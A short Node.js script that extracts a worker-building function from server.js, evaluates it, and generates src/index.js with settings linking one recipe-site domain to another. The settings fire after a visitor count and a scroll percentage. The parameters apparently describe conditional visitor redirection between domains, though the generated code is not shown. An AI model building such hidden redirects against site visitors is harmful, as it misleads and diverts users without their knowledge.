const fs = require('fs');

// We can extract buildWorkerCode from server.js
const serverJs = fs.readFileSync('server.js', 'utf8');

// Use a regex or require to get buildWorkerCode
const fnStart = serverJs.indexOf('function buildWorkerCode({');
const fnEnd = serverJs.indexOf('function buildRobotsTxt({');
const fnCode = serverJs.substring(fnStart, fnEnd);

const buildFn = new Function('return (' + fnCode.trim() + ')')();

const generated = buildFn({
  sourceDomain: 'homeandrecipe.com',
  targetDomain: 'https://asqstyle.com',
  activationMethod: 'visitor_threshold',
  thresholdCount: 4,
  scrollPct: 15,
  triggerCondition: 'both',
  blockThemes: true
});

fs.writeFileSync('src/index.js', generated, 'utf8');
console.log('src/index.js updated successfully! Length:', generated.length);
